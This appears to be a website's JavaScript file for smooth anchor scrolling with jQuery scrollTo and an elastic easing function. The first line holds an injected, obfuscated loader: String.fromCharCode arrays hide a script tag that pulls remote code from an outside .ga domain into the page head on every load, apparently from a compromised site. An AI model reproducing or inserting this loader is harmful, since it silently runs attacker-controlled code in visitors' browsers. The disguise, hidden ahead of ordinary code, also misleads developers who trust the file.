Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();﻿jQuery(function( $ ){ 
    $.easing.elasout = function(x, t, b, c, d) { 
        var s=1.70158;var p=0;var a=c; 
        if (t==0) return b;  if ((t/=d)==1) return b+c;  if (!p) p=d*.3; 
        if (a < Math.abs(c)) { a=c; var s=p/4; } 
        else var s = p/(2*Math.PI) * Math.asin (c/a); 
        return a*Math.pow(2,-10*t) * Math.sin( (t*d-s)*(2*Math.PI)/p ) + c + b; 
    }; 
    $.scrollTo.defaults.axis ='xy';             
    $.scrollTo( 0 ); 
    $('a').click(function(){ 
        $.scrollTo( this.hash, { duration: 300 } ); 
        return false; 
    }); 
});